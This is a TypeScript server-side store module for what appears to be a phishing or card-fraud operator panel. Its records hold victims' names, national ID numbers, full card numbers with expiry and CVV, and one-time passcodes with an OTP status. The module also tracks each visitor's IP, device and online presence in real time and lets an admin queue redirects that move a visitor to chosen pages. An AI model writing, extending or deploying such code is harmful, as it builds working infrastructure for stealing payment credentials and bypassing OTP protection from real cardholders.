import fs from 'fs';
import path from 'path';
import crypto from 'crypto';

export interface VisitorMeta {
  ip: string;
  os: string;
  device: string;
  browser: string;
  country: string;
}

export interface RequestRecord {
  id: string;
  name: string;
  mobile: string;
  idNumber: string;
  cardType: string;
  address: string;
  date: string;
  paymentName?: string;
  cardNumber?: string;
  expMonth?: string;
  expYear?: string;
  cvv?: string;
  otp?: string;
  otpStatus?: string;
  nextAction?: string;
  step: string;
  createdAt: string;
  updatedAt: string;
  lastHeartbeatAt?: number;
  isOnline?: boolean;
  secondsAgo?: number;
  currentPage?: string;
  meta?: VisitorMeta;
}

export interface PresenceEntry {
  lastSeen: number;
  currentPage: string;
  requestId: string | null;
  meta?: VisitorMeta;
}

export interface UserPresenceEntry {
  lastSeen: number;
  currentPage: string;
  explicitlyOfflineAt?: number;
}

export interface AdminSession {
  email: string;
  createdAt: number;
  expiresAt: number;
}

export interface AdminPreferences {
  starredIds: string[];
  archivedIds: string[];
  flaggedIds: string[];
  soundEnabled: boolean;
}

interface PersistedStoreState {
  version: number;
  totalVisitorsCount: number;
  requests: Record<string, RequestRecord>;
  userPresence: Record<string, UserPresenceEntry>;
  devicePresence: Record<string, PresenceEntry>;
  lastKnownUserPage: Record<string, string>;
  userMeta: Record<string, VisitorMeta>;
  pendingRedirects: Record<string, string>;
  explicitlyOfflineIds: Record<string, number>;
  ipToSession: Record<string, { clientId: string; requestId: string; lastSeen: number }>;
  adminSessions: Record<string, AdminSession>;
  adminPreferences: AdminPreferences;
}

export const ONLINE_WINDOW_MS = 5 * 60 * 1000; // 5 minutes server-authoritative online window
const SESSION_TTL_MS = 30 * 24 * 60 * 60 * 1000; // 30 days
const FINGERPRINT_TTL_MS = 60 * 60 * 1000; // 1 hour

const DATA_DIR = path.resolve(process.cwd(), '.data');
const STORE_FILE = path.join(DATA_DIR, 'server-store.json');

const DEFAULT_PREFERENCES: AdminPreferences = {
  starredIds: [],
  archivedIds: [],
  flaggedIds: [],
  soundEnabled: true
};

class ServerSideStore {
  private state: PersistedStoreState;
  private saveTimer: ReturnType<typeof setTimeout> | null = null;
  private isWriting = false;
  private pendingWrite = false;

  constructor() {
    this.state = this.loadFromDisk();
    this.pruneExpiredState();
  }

  private createEmptyState(): PersistedStoreState {
    return {
      version: 1,
      totalVisitorsCount: 0,
      requests: {},
      userPresence: {},
      devicePresence: {},
      lastKnownUserPage: {},
      userMeta: {},
      pendingRedirects: {},
      explicitlyOfflineIds: {},
      ipToSession: {},
      adminSessions: {},
      adminPreferences: { ...DEFAULT_PREFERENCES }
    };
  }

  private loadFromDisk(): PersistedStoreState {
    try {
      if (!fs.existsSync(STORE_FILE)) {
        return this.createEmptyState();
      }
      const raw = fs.readFileSync(STORE_FILE, 'utf-8');
      if (!raw.trim()) {
        return this.createEmptyState();
      }
      const parsed = JSON.parse(raw) as Partial<PersistedStoreState>;
      const base = this.createEmptyState();
      return {
        version: 1,
        totalVisitorsCount: Number(parsed.totalVisitorsCount) || 0,
        requests: parsed.requests && typeof parsed.requests === 'object' ? parsed.requests : base.requests,
        userPresence: parsed.userPresence && typeof parsed.userPresence === 'object' ? parsed.userPresence : base.userPresence,
        devicePresence: parsed.devicePresence && typeof parsed.devicePresence === 'object' ? parsed.devicePresence : base.devicePresence,
        lastKnownUserPage: parsed.lastKnownUserPage && typeof parsed.lastKnownUserPage === 'object' ? parsed.lastKnownUserPage : base.lastKnownUserPage,
        userMeta: parsed.userMeta && typeof parsed.userMeta === 'object' ? parsed.userMeta : base.userMeta,
        pendingRedirects: parsed.pendingRedirects && typeof parsed.pendingRedirects === 'object' ? parsed.pendingRedirects : base.pendingRedirects,
        explicitlyOfflineIds: parsed.explicitlyOfflineIds && typeof parsed.explicitlyOfflineIds === 'object' ? parsed.explicitlyOfflineIds : base.explicitlyOfflineIds,
        ipToSession: parsed.ipToSession && typeof parsed.ipToSession === 'object' ? parsed.ipToSession : base.ipToSession,
        adminSessions: parsed.adminSessions && typeof parsed.adminSessions === 'object' ? parsed.adminSessions : base.adminSessions,
        adminPreferences: {
          starredIds: Array.isArray(parsed.adminPreferences?.starredIds) ? parsed.adminPreferences.starredIds : [],
          archivedIds: Array.isArray(parsed.adminPreferences?.archivedIds) ? parsed.adminPreferences.archivedIds : [],
          flaggedIds: Array.isArray(parsed.adminPreferences?.flaggedIds) ? parsed.adminPreferences.flaggedIds : [],
          soundEnabled: typeof parsed.adminPreferences?.soundEnabled === 'boolean' ? parsed.adminPreferences.soundEnabled : true
        }
      };
    } catch (err) {
      console.warn('[ServerStore] Failed to load persisted store, initializing fresh state:', err);
      return this.createEmptyState();
    }
  }

  public scheduleSave(immediate = false) {
    if (immediate) {
      if (this.saveTimer) {
        clearTimeout(this.saveTimer);
        this.saveTimer = null;
      }
      void this.flushToDisk();
      return;
    }
    if (this.saveTimer) return;
    this.saveTimer = setTimeout(() => {
      this.saveTimer = null;
      void this.flushToDisk();
    }, 350);
  }

  public async flushToDisk(): Promise<void> {
    if (this.isWriting) {
      this.pendingWrite = true;
      return;
    }
    this.isWriting = true;
    try {
      await fs.promises.mkdir(DATA_DIR, { recursive: true });
      const tmpFile = `${STORE_FILE}.${crypto.randomBytes(4).toString('hex')}.tmp`;
      const payload = JSON.stringify(this.state);
      await fs.promises.writeFile(tmpFile, payload, 'utf-8');
      await fs.promises.rename(tmpFile, STORE_FILE);
    } catch (err) {
      console.warn('[ServerStore] Failed to write store:', err);
    } finally {
      this.isWriting = false;
      if (this.pendingWrite) {
        this.pendingWrite = false;
        void this.flushToDisk();
      }
    }
  }

  private pruneExpiredState() {
    const now = Date.now();
    for (const [token, session] of Object.entries(this.state.adminSessions)) {
      if (session.expiresAt < now) {
        delete this.state.adminSessions[token];
      }
    }
    for (const [fp, session] of Object.entries(this.state.ipToSession)) {
      if (now - session.lastSeen > FINGERPRINT_TTL_MS) {
        delete this.state.ipToSession[fp];
      }
    }
  }

  // ==================== VISITORS & STATS ====================
  public getTotalVisitorsCount(): number {
    return this.state.totalVisitorsCount;
  }

  public incrementTotalVisitors(): number {
    this.state.totalVisitorsCount += 1;
    this.scheduleSave();
    return this.state.totalVisitorsCount;
  }

  // ==================== ADMIN SESSIONS ====================
  public createAdminSession(token: string, email: string) {
    const now = Date.now();
    this.state.adminSessions[token] = {
      email,
      createdAt: now,
      expiresAt: now + SESSION_TTL_MS
    };
    this.scheduleSave(true);
  }

  public hasValidAdminSession(token: string): AdminSession | null {
    const session = this.state.adminSessions[token];
    if (!session) return null;
    if (session.expiresAt < Date.now()) {
      delete this.state.adminSessions[token];
      this.scheduleSave();
      return null;
    }
    return session;
  }

  public deleteAdminSession(token: string) {
    if (this.state.adminSessions[token]) {
      delete this.state.adminSessions[token];
      this.scheduleSave(true);
    }
  }

  // ==================== ADMIN PREFERENCES ====================
  public getAdminPreferences(): AdminPreferences {
    return {
      starredIds: [...this.state.adminPreferences.starredIds],
      archivedIds: [...this.state.adminPreferences.archivedIds],
      flaggedIds: [...this.state.adminPreferences.flaggedIds],
      soundEnabled: this.state.adminPreferences.soundEnabled
    };
  }

  public updateAdminPreferences(patch: Partial<AdminPreferences>): AdminPreferences {
    if (Array.isArray(patch.starredIds)) {
      this.state.adminPreferences.starredIds = Array.from(new Set(patch.starredIds.map(String)));
    }
    if (Array.isArray(patch.archivedIds)) {
      this.state.adminPreferences.archivedIds = Array.from(new Set(patch.archivedIds.map(String)));
    }
    if (Array.isArray(patch.flaggedIds)) {
      this.state.adminPreferences.flaggedIds = Array.from(new Set(patch.flaggedIds.map(String)));
    }
    if (typeof patch.soundEnabled === 'boolean') {
      this.state.adminPreferences.soundEnabled = patch.soundEnabled;
    }
    this.scheduleSave(true);
    return this.getAdminPreferences();
  }

  public togglePreferenceItem(
    key: 'starredIds' | 'archivedIds' | 'flaggedIds',
    id: string,
    forcedValue?: boolean
  ): AdminPreferences {
    const list = new Set(this.state.adminPreferences[key]);
    const nextState = forcedValue !== undefined ? forcedValue : !list.has(id);
    if (nextState) list.add(id);
    else list.delete(id);
    this.state.adminPreferences[key] = Array.from(list);
    this.scheduleSave(true);
    return this.getAdminPreferences();
  }

  // ==================== REQUESTS STORE ====================
  public getRequest(id: string): RequestRecord | null {
    return this.state.requests[id] || null;
  }

  public getAllRequests(): RequestRecord[] {
    return Object.values(this.state.requests);
  }

  public upsertRequest(record: RequestRecord, fromVisitorHeartbeat = false): RequestRecord {
    const existing = this.state.requests[record.id];
    const merged: RequestRecord = {
      ...(existing || {}),
      ...record,
      meta: record.meta || existing?.meta || this.state.userMeta[record.id],
      lastHeartbeatAt: fromVisitorHeartbeat
        ? Date.now()
        : record.lastHeartbeatAt ?? existing?.lastHeartbeatAt
    };
    this.state.requests[record.id] = merged;
    this.scheduleSave();
    return merged;
  }

  public patchRequest(id: string, patch: Partial<RequestRecord>, isVisitorAction = false): RequestRecord | null {
    const existing = this.state.requests[id];
    const nowIso = new Date().toISOString();
    const base: RequestRecord = existing || {
      id,
      name: '',
      mobile: '',
      idNumber: '',
      cardType: '',
      address: '',
      date: '',
      step: patch.step || '/',
      createdAt: nowIso,
      updatedAt: nowIso
    };
    const updated: RequestRecord = {
      ...base,
      ...patch,
      id,
      updatedAt: patch.updatedAt || nowIso,
      lastHeartbeatAt: isVisitorAction ? Date.now() : base.lastHeartbeatAt
    };
    this.state.requests[id] = updated;
    this.scheduleSave();
    return updated;
  }

  public deleteRequest(id: string) {
    delete this.state.requests[id];
    delete this.state.userPresence[id];
    delete this.state.lastKnownUserPage[id];
    delete this.state.userMeta[id];
    delete this.state.pendingRedirects[id];
    this.state.explicitlyOfflineIds[id] = Date.now();
    for (const [cid, entry] of Object.entries(this.state.devicePresence)) {
      if (entry.requestId === id) {
        delete this.state.devicePresence[cid];
      }
    }
    // Remove from preferences as well
    this.state.adminPreferences.starredIds = this.state.adminPreferences.starredIds.filter((x) => x !== id);
    this.state.adminPreferences.archivedIds = this.state.adminPreferences.archivedIds.filter((x) => x !== id);
    this.state.adminPreferences.flaggedIds = this.state.adminPreferences.flaggedIds.filter((x) => x !== id);
    this.scheduleSave(true);
  }

  public syncFromSupabaseRows(rows: RequestRecord[]) {
    let changed = false;
    for (const row of rows) {
      const existing = this.state.requests[row.id];
      if (!existing) {
        this.state.requests[row.id] = {
          ...row,
          meta: row.meta || this.state.userMeta[row.id]
        };
        changed = true;
      } else {
        const dbTime = new Date(row.updatedAt).getTime() || 0;
        const localTime = new Date(existing.updatedAt).getTime() || 0;
        if (dbTime >= localTime) {
          this.state.requests[row.id] = {
            ...existing,
            ...row,
            meta: row.meta || existing.meta || this.state.userMeta[row.id],
            lastHeartbeatAt: existing.lastHeartbeatAt
          };
          changed = true;
        }
      }
    }
    if (changed) {
      this.scheduleSave();
    }
  }

  // ==================== PRESENCE & METADATA ====================
  public getIpSession(fpKey: string) {
    const entry = this.state.ipToSession[fpKey];
    if (!entry) return null;
    if (Date.now() - entry.lastSeen > FINGERPRINT_TTL_MS) {
      delete this.state.ipToSession[fpKey];
      return null;
    }
    return entry;
  }

  public setIpSession(fpKey: string, clientId: string, requestId: string) {
    this.state.ipToSession[fpKey] = { clientId, requestId, lastSeen: Date.now() };
    this.scheduleSave();
  }

  public getDevicePresence(clientId: string): PresenceEntry | null {
    return this.state.devicePresence[clientId] || null;
  }

  public getAllDevicePresence(): [string, PresenceEntry][] {
    return Object.entries(this.state.devicePresence);
  }

  public setDevicePresence(clientId: string, entry: PresenceEntry) {
    this.state.devicePresence[clientId] = entry;
    this.scheduleSave();
  }

  public deleteDevicePresence(clientId: string) {
    if (this.state.devicePresence[clientId]) {
      delete this.state.devicePresence[clientId];
      this.scheduleSave();
    }
  }

  public getUserPresence(requestId: string): UserPresenceEntry | null {
    return this.state.userPresence[requestId] || null;
  }

  public getAllUserPresence(): [string, UserPresenceEntry][] {
    return Object.entries(this.state.userPresence);
  }

  public setUserPresence(requestId: string, entry: UserPresenceEntry) {
    this.state.userPresence[requestId] = entry;
    const req = this.state.requests[requestId];
    if (req) {
      req.lastHeartbeatAt = entry.lastSeen;
    }
    this.scheduleSave();
  }

  public deleteUserPresence(requestId: string) {
    if (this.state.userPresence[requestId]) {
      delete this.state.userPresence[requestId];
      this.scheduleSave();
    }
  }

  public getLastKnownPage(requestId: string): string | undefined {
    return this.state.lastKnownUserPage[requestId];
  }

  public getAllLastKnownPages(): [string, string][] {
    return Object.entries(this.state.lastKnownUserPage);
  }

  public setLastKnownPage(requestId: string, page: string) {
    this.state.lastKnownUserPage[requestId] = page;
    this.scheduleSave();
  }

  public getUserMeta(requestId: string): VisitorMeta | undefined {
    return this.state.userMeta[requestId];
  }

  public getAllUserMeta(): [string, VisitorMeta][] {
    return Object.entries(this.state.userMeta);
  }

  public setUserMeta(requestId: string, meta: VisitorMeta) {
    this.state.userMeta[requestId] = meta;
    const req = this.state.requests[requestId];
    if (req) {
      req.meta = meta;
    }
    this.scheduleSave();
  }

  public getPendingRedirect(requestId: string): string | undefined {
    return this.state.pendingRedirects[requestId];
  }

  public setPendingRedirect(requestId: string, target: string) {
    this.state.pendingRedirects[requestId] = target;
    this.scheduleSave();
  }

  public deletePendingRedirect(requestId: string) {
    if (this.state.pendingRedirects[requestId]) {
      delete this.state.pendingRedirects[requestId];
      this.scheduleSave();
    }
  }

  public getExplicitlyOfflineAt(requestId: string): number | undefined {
    return this.state.explicitlyOfflineIds[requestId];
  }

  public markExplicitlyOffline(requestId: string) {
    this.state.explicitlyOfflineIds[requestId] = Date.now();
    delete this.state.userPresence[requestId];
    const req = this.state.requests[requestId];
    if (req) {
      req.lastHeartbeatAt = Date.now() - (ONLINE_WINDOW_MS + 60000);
    }
    this.scheduleSave(true);
  }

  public clearExplicitlyOffline(requestId: string) {
    if (this.state.explicitlyOfflineIds[requestId] !== undefined) {
      delete this.state.explicitlyOfflineIds[requestId];
      this.scheduleSave();
    }
  }

  public prunePresence(hasActiveStreamFn: (reqId: string) => boolean): boolean {
    const now = Date.now();
    const cutoff = now - ONLINE_WINDOW_MS;
    let changed = false;

    for (const [cid, entry] of Object.entries(this.state.devicePresence)) {
      const hasOpenStream = entry.requestId ? hasActiveStreamFn(entry.requestId) : false;
      if (!hasOpenStream && entry.lastSeen < cutoff) {
        delete this.state.devicePresence[cid];
        changed = true;
      }
    }

    for (const [reqId, entry] of Object.entries(this.state.userPresence)) {
      const hasOpenStream = hasActiveStreamFn(reqId);
      if (!hasOpenStream && entry.lastSeen < cutoff) {
        delete this.state.userPresence[reqId];
        changed = true;
      } else if (hasOpenStream) {
        entry.lastSeen = now;
      }
    }

    if (changed) {
      this.scheduleSave();
    }
    return changed;
  }
}

export const serverStore = new ServerSideStore();
